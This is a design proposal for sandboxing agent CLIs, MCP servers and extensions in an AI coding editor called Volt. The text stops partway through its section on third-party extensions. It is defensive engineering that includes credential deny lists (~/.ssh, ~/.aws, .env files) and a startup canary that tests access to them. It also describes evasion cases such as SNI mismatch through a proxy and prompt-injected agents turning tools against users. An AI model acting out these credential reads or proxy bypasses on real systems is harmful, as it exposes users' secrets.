# Proposal: `terra`: the build plan

Round 1. Emphasis: the concrete build plan. That means the PR sequence, file moves, tests, the CI matrix, effort, and how main stays shippable. Every section of brief §6 is covered. §12 (roadmap) is the deepest, followed by §11 (verification).

Conventions:
- `main:` means this checkout (Volt 0.0.6).
- `sbx:` means `feat/volt-sandbox`, read with `git show`.
- **Guess** marks anything I have not verified.
- Effort is in engineer-weeks (ew) for one engineer working with agents. Every effort number is a guess.

---

## 0. Position in one page

1. **Reorder the brief's "migrate first, then sandbox" for the part that carries the real risk.** The threats that exist today are prompt-injected agents, agent CLIs, terminals and MCP servers. Plugins don't run third-party code yet: the 30 `extensions/volt-*` are manifest-only (`main:extensions/volt-*/package.json`, `"contributes": {}`).
   - `feat/volt-sandbox` already sandboxes agent CLIs. Merge it and harden it first (PR 1–6), because it protects users from day one.
   - Feature migration runs in parallel (PR 7–17).
   - Plugin sandboxing comes after the extension API exists (PR 18–26).
   - The user's order is kept where it matters: no plugin is sandboxed before it is a plugin.
2. **"Migrate everything into extensions" means moving features behind an API boundary, not into another process.** About a third of the features are deep workbench UI: the browser `<webview>` and CDP, the Scratch board, visuals drawn in the chat, simulator streaming, computer use with TCC, and the Customize Playground that restyles the workbench.
   - Moving those into an extension host means rewriting them as webviews. That is underestimated by an order of magnitude.
   - I propose two kinds of first-party plugin:
     - **in-process feature packages** (T0): code stays in the renderer but sits behind a lint-enforced API facade and loads only when enabled;
     - **out-of-process first-party extensions** (T1): for the features that are already process-shaped (providers, the code index, memory, playgrounds, commit review, usage, automations, git graph, pull requests).
3. **Replace "first-party = allow all" with "first-party = pre-approved declared capabilities".**
   - First-party plugins never prompt.
   - Their out-of-process parts still run under a policy compiled from their manifest. They start in *audit* mode (log, don't block) and move to *enforce* once the denial telemetry is clean.
   - "Allow all" signed code is a single key compromise away from "allow all" malware. That is DeepSeek's CVE-2026-82533 lesson: a trusted channel with unchecked authority.
4. **Windows is the biggest underestimated item.**
   - MXC process isolation needs Windows 11 24H2 26100.9278+ (brief §4). Windows 10 and most enterprise LTSC fleets get nothing.
   - GitHub's hosted Windows runners are Server 2022/2025. **Guess:** MXC ProcessContainer is unverified on Server SKUs. So the Windows backend probably needs a self-hosted Windows 11 runner before it can be a required check.
   - Plan for Windows to ship *refuse + explicit "Run outside sandbox"* for at least two releases after macOS and Linux enforce.
5. **The first sandboxed long-lived host should be the one desktop already talks to.** By default, desktop is a client of a local volt-server (brief §3). Running T3 extension hosts in that server's `cp.fork` path (`main:src/vs/server/node/extensionHostConnection.ts:277`) gives one implementation for desktop, web and phone. It also avoids fighting Electron's `utilityProcess` (`main:src/vs/platform/extensions/electron-main/extensionHostStarter.ts:77`).

---

## 1. Threat model

### Assets
| Asset | Where it lives |
|---|---|
| Credentials | `~/.ssh`, `~/.aws`, `~/.config/gh`, keychain/libsecret/DPAPI, `.env*`, provider tokens in Volt `SecretStorage`, the volt-server HMAC secret, device pairing tokens |
| Source and history | Workspaces, worktrees, git refs/hooks/config (hooks are code execution) |
| Volt's control plane | Host MCP (`voltHostMcp*`), the agent-server socket/port, ext-host IPC, the update feed, the extension gallery, `~/.volt/*` (customize, permissions, awake/sudoers helper) |
| The user's machine | Persistence (shell rc, LaunchAgents, systemd user units, Run keys), resources (disk, memory, CPU), the local network (routers, NAS, cloud metadata) |
| User attention | Permission prompts are a scarce asset, and fatigue is an attack |

### Attackers
| Attacker | Entry | What they want | Primary control |
|---|---|---|---|
| A1 Malicious plugin | Open VSX / Volt registry install | Exfiltrate credentials, persist, pivot | T2/T3 host sandbox + capabilities + review |
| A2 Compromised update | Hijacked publisher account or Volt CI key | Same as A1, but trusted | Signing with offline root, pinned publisher keys, revocation, staged rollout |
| A3 Prompt-injected agent | Repo text, web page, issue, MCP result | Use the agent's tools against the user | Agent CLI sandbox (sbx), host tool classes (`sbx:src/vs/workbench/services/voltRuntime/common/hostToolSandbox.ts:36`), grants never widen silently |
| A4 Malicious repo | `.vscode/`, `.volt/sandbox.json`, git hooks, `package.json` scripts, `.claude/settings.json` | Code execution at open or at the agent's first command | Workspace Trust + narrow-only repo policy layer + protected paths |
| A5 Network attacker | MITM, DNS rebinding, captive portal | Feed payloads, reach loopback services | Proxy resolves-and-pins, private-IP refusal, TLS left intact end to end |
| A6 Local unprivileged process | Another user/app on the machine | Talk to volt-server or Host MCP | HMAC bearer per session, loopback Host check, unix sockets with 0600 |
| A7 Remote client | Paired phone/browser, tunnel | Drive the agent server | Device tokens, scoped server API; same capability checks as local |

### Trust boundaries (the ones we enforce)
1. Renderer ↔ main ↔ volt-server: Electron sandboxed renderer and IPC validation (VS Code's).
2. Core ↔ plugin host: the RPC protocol. The **main-thread proxy is the only place capabilities are checked**, never inside the plugin's process.
3. Plugin host ↔ OS: SandboxManager policy (FS, network, process, env, IPC).
4. Plugin ↔ plugin: one host per publisher for T3, one SES Compartment per plugin inside the OS-sandboxed T2 host.
5. Sandbox ↔ network: the per-host proxy. Nothing else routes out.
6. Volt ↔ distribution: signature verification at install *and* at load.

### Out of scope (stated so nobody assumes it)
- Kernel, hypervisor and Seatbelt/bwrap zero-days. The microVM tier (option D) is the answer for people who need that.
- Side channels (Spectre and timing) between plugins in one T2 host. Mitigation is per-host process separation for high-risk plugins only.
- Malicious first-party Volt code in the signed app bundle. If the app is compromised, everything is.
- Physical access, and a malicious OS administrator.
- T0 in-process feature packages. They have renderer privileges by construction. Their control is code review and signing, not sandboxing.
- Domain fronting through an allowed CDN. We don't MITM TLS (§5), and we accept this.

---

## 2. Trust tiers and host model

| Tier | What | Runs where | OS sandbox | API reach | Signing |
|---|---|---|---|---|---|
| **T0 core** | Chats, queue, subagents, run groups, questions, worktrees, terminals, workspace context, images (`main:src/vs/workbench/contrib/voltCustomize/common/voltFeatures.ts:96-226`, the entries with no `extensionId`) | Renderer + main + volt-server | none (it *is* the enforcer) | everything | app code signature |
| **T0p in-process feature packages** | browser, scratch, visuals, devices, computerUse, customize | Renderer (lazy-loaded) + their native helpers | Helpers only (speech, desktop, sim helpers get their own policies) | Only through `IVoltExtensionApi` facade (lint) | app code signature + `product.json` checksums |
| **T1 first-party extensions** | providers ×12, codeIntelligence, memory, playgrounds, commitReview, usage, automations, gitGraph, pullRequests, agentResources, skills, claudeAccounts, remoteDevices | First-party ext host on volt-server (Node, `cp.fork`) | **Yes**, declared policy, audit → enforce | `volt.*` API, pre-granted declared capabilities | Volt release key; bundled copies covered by app signature |
| **T2 Volt-native third-party** | Plugins written against `volt.*` only | One OS-sandboxed Node "plugin host" per window/server, SES `lockdown()`, one Compartment per plugin; UI in iframes (webviews); Wasm via jco later | **Yes**: FS none, network via proxy with per-plugin identity, exec none | Endowments only (RPC), granted per plugin | Publisher key (TOFU-pinned), Volt registry countersign optional |
| **T3 VS Code extensions** | Open VSX extensions, no Volt manifest | One sandboxed ext host per publisher (cap 8, then shared "untrusted pool"), forked by volt-server; `browser`-entry extensions prefer the web-worker host | **Yes**: default policy §9.1 | VS Code API; Volt API only with a manifest | Open VSX signature if present (**guess:** Open VSX signing coverage is partial) |
| **MCP servers** | stdio servers Volt launches (Agent Resources), plus servers launched by agent CLIs | SandboxManager one-shot or long-lived; CLI-launched servers inherit the CLI's sandbox | **Yes** | MCP only | n/a (declared in config) |
| **Agent CLIs** | claude, codex, cursor-agent, grok, opencode, pi… | SandboxManager long-lived (already on sbx) | **Yes** | ACP + Host MCP with per-session HMAC | Vendor binaries (we verify the path, not a signature) |
| **VM tier (opt-in)** | Any of the above under "Strict" | microVM per session (option D) | VM | same RPC | same |

**Desktop vs server.**
- Every sandboxed host (T1/T2/T3) is forked by **volt-server**, including the local server desktop already uses.
- Desktop's `utilityProcess` local ext host stays, but it is restricted to *T0p helpers and extensions the user explicitly marked "Run unsandboxed"*. It is the escape hatch, not the default.
- For web and phone this is already how things work: their extensions run on the server.

---

## 3. SandboxManager core

### 3.1 What exists (sbx) and what we add

Exists:
- `SandboxManager.prepare/run/dispose` (`sbx:src/vs/platform/voltSandbox/node/sandboxManager.ts:86,149,237,358`).
- `IPreparedSandbox` with `confirm`, `terminate` and `allowDomains` (`:50-70`).
- The backend contract `ISandboxBackend.probe/launch` → `ISandboxLaunchSpec.confirm/terminate/dispose` (`sbx:src/vs/platform/voltSandbox/node/sandboxBackends.ts:30-62`).
- Enforcement check (`sbx:src/vs/platform/voltSandbox/common/sandboxBackend.ts:91`).
- Schema v1 (`sbx:src/vs/platform/voltSandbox/common/sandboxSchema.ts:17,111,129`).
- Capability vocabulary `fs.read … socket` (`sbx:src/vs/platform/voltSandbox/common/sandboxCapabilities.ts:64-128`) with `evaluateCapabilities` (`:206`).

Missing:
1. A first-class long-lived handle. Today the caller holds `IPreparedSandbox` and the `ChildProcess` separately.
2. Grant epochs, so a live grant reaches a running process (the brief's "Allow host" gap).
3. A service wrapper with status events for UI and telemetry.
4. Policy v2 with a target version.
5. A Windows backend.

### 3.2 API (new, `src/vs/platform/voltSandbox/node/sandboxService.ts`)

```ts
export const IVoltSandboxService = createDecorator<IVoltSandboxService>('voltSandboxService');

export interface IVoltSandboxService {
	readonly _serviceBrand: undefined;
	/** Probed once per process, re-probed on demand (Settings > Security > Re-check). */
	capabilities(): Promise<ISandboxBackendCapabilities>;
	/** One-shot: terminal_start-style commands, git hooks, MCP probes. Wraps SandboxManager.run. */
	run(request: ISandboxRequest, options?: ISandboxRunOptions): Promise<ISandboxRunResult>;
	/** Long-lived: agent CLIs, MCP servers, extension hosts. Resolves only after confirm() succeeds. */
	start(request: ISandboxHostRequest): Promise<ISandboxedProcess>;
	readonly onDidChangeStatus: Event<ISandboxStatusChange>;   // UI + telemetry
	list(): readonly ISandboxedProcessInfo[];                  // Settings > Security, `volt sandbox ps`
}

export interface ISandboxHostRequest extends ISandboxRequest {
	/** Stable identity: `ext:<publisher>`, `agent:<chatId>`, `mcp:<serverId>`. Keys denials, grants, proxy identity. */
	readonly principal: string;
	/** Node fork semantics: NODE_CHANNEL_FD + an ipc stdio slot; env allowlist from §3.6. */
	readonly fork?: { readonly modulePath: string; readonly execArgv: readonly string[] };
	/** Restart policy on crash; never restarts outside the sandbox. */
	readonly restart?: { readonly maxPerMinute: number };
}

export interface ISandboxedProcess {
	readonly principal: string;
	readonly pid: number;
	readonly status: SandboxIsolationStatus;          // 'initialized' | 'partial'
	readonly unenforced: readonly SandboxDimension[];
	readonly onDenial: Event<ISandboxRunDenial>;
	readonly onExit: Event<{ code: number | null; signal: string | null }>;
	/** Network grants are live (the proxy reads them per connection). */
	grantHosts(entries: readonly string[], scope: 'session' | 'persistent'): void;
	/** FS grants are NOT live in the OS layer (Seatbelt/bwrap fix them at launch): they go through the file broker (§10). */
	readonly grantEpoch: number;
	/** Policy changes that need a relaunch (FS/exec widening) restart the host with the new policy; the RPC layer reconnects. */
	relaunch(policy: IVoltSandboxPolicy, reason: string): Promise<void>;
	terminate(): Promise<void>;
}
```

The design rule behind `grantHosts` versus `relaunch`: **only the network can widen live.** That rule decides the whole live-grant UX.
- Seatbelt profiles are fixed at `sandbox_init`, and bwrap's mounts are fixed at clone.
- Any filesystem widening at runtime is therefore a broker call (§10) or a relaunch.
- This rule also fixes the "Allow host" bug. `voltStdioService.allowSandboxDomains` (`sbx:src/vs/platform/voltStdio/node/voltStdioService.ts:219`) gets a caller, which goes through `ISandboxedProcess.grantHosts` → `IPreparedSandbox.allowDomains`. `sandboxLaunchKey` then gains `grantEpoch` only for *relaunch-class* changes.

### 3.3 Policy schema v2 and versioning

- v1 stays parseable forever (`SANDBOX_POLICY_SCHEMA_VERSION = 1`, `sbx:…/sandboxSchema.ts:17`).
- v2 adds:
  - `"targetPolicy": <int>`: like Android's targetSdk. A plugin declares the policy level it was built for. Each Volt release may add *restrictions* gated on `targetPolicy >= N`, and an older plugin keeps the old defaults until it updates. The difference from Android: Volt can force a floor (`minimumTargetPolicy` in `product.json`) for security fixes, and plugins below that floor stop loading with a clear message.
  - `"principal"`: who the policy is for. It is filled by core and never by the plugin.
  - `network.local`: `none | ask | allow`. This is separate from internet, following the Android 17 lesson. It covers RFC1918 and mDNS, and the proxy refuses those addresses today.
  - `network.udp`: `none` only, for now. The key is reserved so that adding it later is a schema change and not a semantic one.
  - `ipc.volt`: which Volt RPC channels the host may open, for example `extHost`, `hostMcp:<sessionId>`. This replaces ad-hoc `host.unixSockets` entries for Volt's own sockets.
  - `audit: true`: denials are logged but not blocked. **Only trusted layers may set it** (first-party during rollout, or the user).
- **Capabilities compile to policy.** The function is `compilePolicy(manifest: IVoltCapabilityManifest, grants: IGrantSet, base: IVoltSandboxPolicy, target: number): IVoltSandboxPolicyLayer`. It is a pure function in `common/`, and it is the unit most worth fuzzing.

### 3.4 Composition and layering (keep sbx's rule, add order)

The layers below are listed in application order. Trusted layers may widen; untrusted layers may only narrow. sbx already drops and records widening attempts (brief §3).

| # | Layer | Trust |
|---|---|---|
| 1 | Built-in base profile for the tier | trusted |
| 2 | Capability grants: manifest ∩ granted, compiled | trusted (core compiled it) |
| 3 | User policy `~/.volt/sandbox.json` | trusted |
| 4 | Admin policy `/etc/volt/sandbox.json`, or MDM on macOS/Windows | trusted, **and wins over the user**: it is applied last as a narrow-only cap |
| 5 | Repo policy `.volt/sandbox.json` | **untrusted, narrow-only**, and only when the workspace is trusted |
| 6 | Per-run narrowing (a tool that wants less) | narrow-only |

Credentials, protected paths and secret env names are applied after all layers and cannot be unmasked except by layer 3, with a visible warning.

### 3.5 Lifecycle: probe → enforce → launch → confirm → refuse → terminate

These are unchanged from sbx, with four additions:
1. **Probe results are cached per (backend, OS build, binary hash)** in `~/.volt/sandbox/probe.json`. When the OS updates, they are re-probed. This lets us report "enforced on macOS 15.4" precisely.
2. **Confirm for long-lived hosts adds a canary from inside.** Right after the host is up, before it gets any work:
   - it tries `connect()` to a public IP directly, which must fail;
   - it tries to open `~/.ssh` (a sentinel file we create in tests), which must fail.
   - If either succeeds, the host is killed and the status becomes `failed`.

   The canary is ~5 ms and catches backend drift. It matters most on Windows, where proxy routing is "guaranteed only by behaviour" (brief §4, srt PR #766).
3. **Refuse UX is one component** for every principal. It shows what was refused, which dimension wasn't enforced, and offers *Fix* (when the probe knows how, e.g. the `kernel.apparmor_restrict_unprivileged_userns` sysctl), *Run outside sandbox (this time)*, and *Details*.
4. **Terminate** gets a reaper for the macOS `setsid` double-fork survivor (brief §3).
   - Proposal: launch the workload under a tiny `volt-sbx-init` that is the session leader. It records descendants through `proc_listchildpids` polling and kills by a `VOLT_SBX_TAG` env marker found through `sysctl KERN_PROCARGS2`.
   - **Guess:** a cleared-env double-fork evades the marker. The fallback is to scan for processes whose parent chain ended at our init *or* whose executable cwd is the run's private tmp dir.
   - This needs a spike (PR 4). Until then the documented limitation stands (the escapee stays sandboxed).

### 3.6 Long-lived hosts: the environment problem

`bootstrap-fork` needs `VSCODE_ESM_ENTRYPOINT`, `VSCODE_HANDLES_UNCAUGHT_ERRORS`, `VSCODE_PIPE_LOGGING`, `VSCODE_VERBOSE_LOGGING`, `VSCODE_PARENT_PID`, `VSCODE_CODE_CACHE_PATH`, `VSCODE_NLS_CONFIG`, `ELECTRON_RUN_AS_NODE`, `NODE_CHANNEL_FD` and `NODE_CHANNEL_SERIALIZATION_MODE`. **Guess:** this list is to be confirmed against `bootstrap-fork.ts` and `extensionHostConnection.ts` in PR 18.

`isSecretEnvName` drops all of these (brief §2). The fix:
- A **trusted host layer** `env.set` is computed by core: values come from core, never from the parent environment.
- `env.inheritExact: string[]` is allowed only in trusted layers.
- A unit test asserts that the forked host boots with exactly this set and nothing else (a diff against `process.env` inside the host).

### 3.7 Live grants

| Grant | Live? | Mechanism |
|---|---|---|
| Network host | yes | Proxy allowlist per principal, read per connection |
| Local network | yes | Same proxy, `network.local` flag |
| File/folder | via broker | The picker gives a handle; the broker reads and writes for the plugin (§10) |
| Workspace widening | relaunch | `relaunch()` with the new policy; RPC reconnects; the UI says "Restarting <ext> with access to …" |
| Exec | relaunch | Same |
| Revoke anything | yes for network; relaunch otherwise | Revocation never waits for idle |

---

## 4. Backends per OS

| OS | Backend | Minimum | Status at PR | CI |
|---|---|---|---|---|
| macOS | Seatbelt via `sandbox-exec` (sbx) | **Guess:** macOS 12, which Electron 37 supports. `sandbox-exec` is deprecated but present through macOS 15/26 | Enforced (PR 1) | `macos-15` arm64 hosted (exists on sbx); add `macos-14` for the oldest supported major |
| Linux | bwrap + seccomp + socat bridge (sbx) | bwrap ≥ 0.8 (needs `--disable-userns`, `--json-status-fd`; **guess:** confirm the exact version in the probe), kernel ≥ 5.x with unprivileged userns | Enforced (PR 1) | `ubuntu-24.04` x64 (exists), `ubuntu-24.04-arm`, Docker rig: Debian 12, Fedora 41 (SELinux enforcing), Ubuntu 22.04, an Arch rolling image |
| Windows 11 24H2+ (builds in brief §4) | MXC ProcessContainer via signed `wxc-exec.exe` | 26100.9278+ / 26200.9278+ / 26300.9550+ / 28000.2804+ | Enforced FS+process, network = loopback-proxy-only by IP rule, confirm canary required (PR 9) | **Self-hosted Windows 11 25H2 runner** for adversarial runs; hosted `windows-2025` runs the refuse path and unit tests |
| Windows 10 / older 11 | none | n/a | **Refuse + "Run outside sandbox"**, with a banner explaining why | hosted `windows-2022` (the build runner, `main:.github/workflows/volt-build.yml:472`) checks that the refusal happens |
| Windows fallback (later) | srt-win-style: dedicated local user + WFP + ACLs + restricted token + job object | Win10 1809+ (**guess**) | Behind `volt.sandbox.windows.legacyBackend`, PR 25, only if Windows-10 demand is real | self-hosted Win10 VM |

My calls:
- **MXC primary on Windows**, launched through `wxc-exec`. The Node SDK is not an option on Node 22.19 (brief §2).
- **Refuse below the build floor.** Do not ship srt-win in v1: it needs an elevated install, creates a local user account and edits WFP. That is a support and security surface we can't test well without self-hosted runners.
- **Revisit option B** (MXC everywhere) only for Linux LXC on hosts without userns.

Risks to note:
- srt's PR #766 lists MSYS2/Git Bash crashing (`0xC0000005`) under MXC BaseContainer. Agents on Windows *live* in Git Bash, so this can make Windows agents unusable even on supported builds.
- The confirm canary (§3.5) and a Git Bash smoke test are acceptance criteria for PR 9, not afterthoughts.
- `wxc-exec.exe` is Microsoft-signed, and we bundle it in the win32 build. The probe verifies its Authenticode signature (`WinVerifyTrust`) before trusting it. Without that, a writable install dir turns `wxc-exec` into the attack.

---

## 5. Network broker

Sol owns the depth here. These are the build requirements.

- **One proxy per principal** (per long-lived host or per one-shot run), not per Volt. Identity is the port plus a per-host `Proxy-Authorization` token, so a T2 host's plugins are told apart by the token their Compartment's `fetch` endowment adds. Denials and grants are keyed by principal.
- **Hostname rules:** exact host or `*.x`. A rule with no port means 443/80 (sbx).
  - New: `https` only by default for T2/T3. Port 80 needs an explicit `:80`.
  - Wildcards may not be bare TLDs or public-suffix entries. This needs the PSL, bundled.
- **DNS:** the sandbox has no resolver. On macOS, explicitly deny `com.apple.dnssd.service` and `mDNSResponder` mach lookups (closes the brief's gap). The proxy resolves, refuses any private result, and connects to the checked address (sbx).
  - New: a 5 s DNS TTL floor and per-connection re-check, against rebinding between check and use (already pinned by connecting to the checked IP; keep a test).
- **Loopback:** none by default. `loopbackPorts` is granted only for dev-server tools, and the Host MCP port is **never** grantable to T2/T3. This is the DeepSeek CVE-2026-82533 lesson: the sandbox left loopback open to an unauthenticated control API.
- **Local network:** the `net.local` capability, prompt-gated, and separate from `net.connect`.
- **UDP:** denied. QUIC falls back to TCP. DNS goes through the proxy. Reserved in the schema.
- **TLS:** no interception.
  - New cheap check: peek the ClientHello SNI on CONNECT and require SNI == CONNECT host (or no SNI). This stops the trivial "CONNECT allowed.com, SNI evil.com" case.
  - It does not stop ECH or Host-header fronting behind a shared CDN. That is documented as out of scope (§1).
- **`host` mode** (unfiltered) is allowed only for T0/T1 and the user's explicit choice, and it's shown as a red state in Settings → Security.
- **Denials → Allow host:**
  1. A denial event carries `{principal, host, port, ts}`.
  2. The UI coalesces denials per principal over 2 s into one inline row: "cursor-agent tried api.foo.dev · Allow once / Always for this extension / Deny".
  3. *Allow* calls `grantHosts` live (§3.7).

---

## 6. Migration: features → extensions

### 6.1 Classification (all 30)

| Feature (id → extension) | Today | Class | Target tier | Volt API it needs | Wave |
|---|---|---|---|---|---|
| memory → `volt.memory` | tools in voltRuntime | process-shaped | T1 | `volt.tools.register`, `volt.storage` (scoped), `volt.skills.write` | A |
| playgrounds → `volt.playgrounds` | tools | process-shaped | T1 | `volt.tools.register`, `volt.http.serve` (loopback via core), `volt.browser.check` | A |
| commitReview → `volt.commit-review` | tools + tray UI | mixed | T1 + webview tray in slot `chat.aboveComposer` | tools, `volt.git` broker, `voltPanels` | A |
| codeIntelligence → `volt.code-intelligence` | `voltCodeIndex` child of the agent server | process-shaped (already a child) | T1 + its index child under its own policy (fs.read workspace, net none) | tools, `volt.workspace.files` (read) | A |
| provider.* ×12 → `volt.provider-*` | ACP launch code in voltRuntime | process-shaped | T1 (describe-only, §6.3) | `volt.providers.register` | B |
| claudeAccounts → `volt.claude-accounts` | accounts swap under Claude's locks | process-shaped, writes `~/.claude*` | T1 with a declared `fs.write` on the Claude config dir | `volt.secrets`, `volt.providers.accounts` | B |
| usage → `volt.usage` | Usage page + button + dock | UI | T1 + webview page | `volt.providers.usage`, `voltPanels` (settings page slot), slot item | C |
| automations → `volt.automations` | calendar, runs | UI + scheduler | T1 (scheduler) + webview pages | `volt.agents.send`, `volt.scheduler`, `voltPanels` | C |
| gitGraph → `volt.git-graph` | Git Graph tab | UI | T1 + webview editor | `volt.git` (read), `volt.agents.send` (Ask agent) | C |
| pullRequests → `volt.pull-requests` | gh-backed | UI + process | T1 (gh via `volt.terminals.exec` broker) + webview | `volt.git`, `volt.exec` broker, slot items | C |
| agentResources → `volt.agent-resources` | sidebar group + page | UI, reads harness files | T1 + webview | `volt.agentResources.list` (core keeps the reader) | C |
| skills → `volt.skills-and-plugins` | customize page + marketplace | UI + network | T1 + webview | `volt.agentCustomize`, `net.connect` skills.sh | C |
| remoteDevices → `volt.remote-devices` | pairing UI | UI over core server | T1 + webview settings page | `volt.server.pairing` (core keeps tokens) | C |
| browser → `volt.browser` | `<webview>` + CDP + tools | deep UI | **T0p** | facade only | D |
| scratch → `volt.scratch-board` | whiteboard, agent dock | deep UI | **T0p** | facade | D |
| visuals → `volt.visuals` | charts/HTML in chat | deep UI (chat renderer) | **T0p** (render_html already isolates in an iframe) | facade | D |
| devices → `volt.devices` | sim streaming, native helpers | deep UI + native | **T0p** + helper policies | facade | D |
| computerUse → `volt.computer-use` | desktop helpers, TCC | native, TCC-bound to the app | **T0p**; the helper can't be OS-sandboxed and keep AX access (**guess**), so it gets a consent gate per chat (exists) | facade | D |
| customize → `volt.customize` | restyles the workbench | deep UI | **T0p** forever | facade | D |

The core list stays core: threads, queue, subagents, runGroups, questions, worktrees, terminals, workspaceContext, images (`voltFeatures.ts:96-226`). Two of these have to stay core for security reasons, not convenience:
- **terminals**: SandboxManager's main client.
- **worktrees**: protected git paths.

### 6.2 How code moves out of `contrib/`

There are three mechanical steps per feature, each its own commit inside the feature's PR:

1. **Fence.** Move the code to `src/vs/workbench/contrib/volt/features/<id>/` with `<id>.contribution.ts`. A new `valid-layers-check` rule (`build/lib/layersChecker` style, or an eslint `local/code-import-patterns` entry) allows imports only from:
   - `base/`;
   - `platform/` (allowlisted services);
   - `workbench/services/voltExtensionApi/common/*` (the facade).

   `IVoltFeatureService` starts loading the contribution lazily (`import()`) only when the feature is on. Disabling it then really unloads code, not just hides it. *T0p features stop here.*
2. **Mirror the API.** Every facade method the feature uses gets a `volt.*` extension API twin (`MainThreadVolt*` / `ExtHostVolt*`) with a capability check in the main thread.
3. **Lift.** The feature's non-UI code becomes `extensions/volt-<id>/src/extension.ts`, compiled by the existing `compile-extensions` job. UI becomes a webview (`voltPanels`, customize.md §6.3) using `volt-ui.css`. Its `contrib/volt/features/<id>` folder is deleted in the same PR.

### 6.3 Providers: describe, don't spawn

Provider extensions never get `process.exec`. They register a description, and core launches it through SandboxManager:

```ts
volt.providers.register({
	id: 'claude',
	models(): Thenable<IVoltModel[]>,
	launch(ctx: { chatId, cwd, model }): IVoltAgentLaunchSpec,   // { command: 'claude', args, env (non-secret), acp: true, policyHints }
	auth: { status(): Thenable<IVoltAuthStatus>; signIn(): Thenable<void> },
	usage?(): Thenable<IVoltUsage>,
});
```

This keeps the hardest guarantee in one place: agent CLIs only ever start sandboxed, from core, with core's policy. A malicious *provider* extension can lie about models but can't start an unsandboxed process.

### 6.4 Keeping Volt shippable during migration

- One feature per PR. No shim period with two code paths, because double maintenance is worse than one careful swap. Each swap rides **beta for one release** before stable (the release pipeline already has beta/stable channels: `volt-beta.yml`, `volt-stable.yml`).
- Per migration PR:
  - a parity checklist run live (fresh profile, CDP);
  - enable/disable live with no reload;
  - startup time measured before and after (memory: *Measure startup via CDP*);
  - VSIX size.
- `IVoltFeatureService` already gives each feature its own kill switch, which is disabling the built-in extension. When a migration PR regresses, users can turn the feature off while we fix it.

---

## 7. Signing and trust

| Artifact | Signed by | Verified when | Gives |
|---|---|---|---|
| App bundle incl. bundled `extensions/volt-*` | Apple notarization / Authenticode / (Linux: signed repo metadata) | OS at launch; Volt at load via `product.json` checksums (**guess:** VS Code's `checksums` integrity check covers core files; extend it to bundled first-party extension folders) | T0/T0p/T1 trust, zero prompts |
| First-party extension updated out of band | Volt release key (Ed25519), CI-held, short-lived via GitHub OIDC → KMS | Install + every load (hash of the installed folder vs signed manifest) | T1 trust |
| Volt release key itself | Offline root key (two YubiKeys, two people) | Root → release key certificate in `product.json`, rotatable by app update | Rotation without trusting the network |
| Third-party Volt-native plugin | Publisher key (TOFU-pinned on first install; registry countersign optional) | Install + update: same key or the update is refused | Continuity: an account takeover can't push a differently keyed update |
| Revocation | Signed denylist in the update feed (`static feed branch`, `volt-release-pipeline`) checked at startup and every 6 h | Revoked → disabled, host killed, banner | Kill a bad plugin or key fast |

**"Allow all for first-party", challenged.** For T0/T0p it is moot: renderer code can already do anything. For T1 it should mean **pre-granted declared capabilities**:
1. Each first-party extension declares `voltCapabilities` like anyone else.
2. Being signed by the Volt key means the grants are pre-approved: no install sheet, no prompts.
3. Its host runs under the compiled policy with `audit: true` for the first two releases after it moves to T1. We collect denial telemetry, fix the manifests, then flip to enforce.

The user sees the same zero friction. A compromised Volt release key then yields "the union of declared first-party capabilities", not "everything", and a reviewer can see a first-party manifest suddenly asking for `fs.read: home`.

**Reproducible builds.**
- Extensions are compiled by esbuild with pinned versions. Make `compile-extensions` deterministic (sorted inputs, `SOURCE_DATE_EPOCH`).
- A nightly job rebuilds the last release's `extensions/volt-*` and diffs the hashes.
- The full Electron app is a non-goal for v1.

**Dev / unsigned mode.**
- `--extensionDevelopmentPath` folders are trusted *for that window only*.
- A setting `volt.extensions.allowUnsigned: "ask" | "never"` defaults to `ask`. It shows a sheet listing capabilities, the same one a third-party plugin gets.
- Unsigned code is never pre-granted anything.

**Playground drafts (`local.*`).**
- A prompt-injected agent can write a draft, so drafts are **not** trusted because the user "made" them.
- Looks and layouts are data and need no grants.
- Code in a draft runs as T2/T3 with an install sheet on *Install as Extension*.

---

## 8. Permissions model and UX

### 8.1 Manifest

Keep the name `contributes.voltCapabilities` (customize.md §8) and make it structured:

```jsonc
"contributes": {
  "voltCapabilities": {
    "targetPolicy": 1,
    "required": [
      { "id": "net.connect", "hosts": ["api.linear.app"], "why": "Sync your Linear issues" },
      { "id": "agents.read" }
    ],
    "optional": [
      { "id": "agents.send", "why": "Send an issue to a chat when you click Send" },
      { "id": "fs.read", "scope": "workspace" }
    ]
  }
}
```

- The vocabulary is sbx's (`fs.read`, `fs.write`, `net.connect`, `net.host`, `net.listen`, `net.loopback`, `process.exec`, `git.local`, `git.remote`, `env`, `socket`; `sbx:…/sandboxCapabilities.ts:64-128`) plus the API capabilities `agents.read`, `agents.send`, `terminals.run`, `tools.register`, `secrets`, `clipboard.read`, `net.local`.
- Unknown ids fail install (strict, like the policy parser).
- `why` is required for anything rated `high` or `critical` by `SANDBOX_RISK_ORDER`.

### 8.2 When grants happen

| Kind | When | Example |
|---|---|---|
| Install-time | `required`, shown on one sheet; a decline cancels the install | `net.connect api.linear.app` |
| Runtime, first use | `optional`, prompted inline the first time the API is called, with a user gesture required for high-risk ones | `agents.send` |
| One-time | File picker grants, "Allow host once" | Picking `~/Downloads/a.csv` |
| Never grantable to T2/T3 | Host MCP loopback, `net.host`, `fs.write` outside workspace + own storage, `process.exec` for T2 | n/a |

### 8.3 Storage, revoking, visibility

- **The grant store is owned by volt-server** (`~/.volt/permissions/<principal>.json`, 0600). It is keyed by `principal` + publisher key fingerprint + version range.
  - The server owns runtimes, so desktop, web and phone see one truth.
  - A major version bump with new `required` capabilities re-prompts, the way Android re-asks on new dangerous permissions.
- **Revoking:** Settings → Extensions → <ext> → Permissions (a `WorkbenchList`, edge to edge, per the lists rule), plus Settings → Security → "Sandbox activity" (principal, status, unenforced dimensions, recent denials).
  - Revoke applies live for the network and by relaunch otherwise (§3.7).
- **Fatigue control:**
  - prompts are coalesced per principal per 2 s;
  - "Always for this extension" is the second button, not hidden;
  - after three denials of the same request in a session, Volt stops asking and shows a passive badge;
  - first-party never prompts;
  - repo-declared policies never prompt (they only narrow).

---

## 9. Third-party extensions

### 9.1 VS Code extensions with no manifest: the default T3 policy

| Dimension | Default |
|---|---|
| FS read | Workspace folders, the extension's own install dir, its `globalStorage`/`workspaceStorage`, system dirs needed by Node, `~/.vscode-oss`-style config of *that* extension only |
| FS write | Workspace (minus protected paths), its storage dirs, tmp |
| FS deny | Credentials + `.env*` + other extensions' storage + `~/.volt` (sbx always-deny, plus the new entries) |
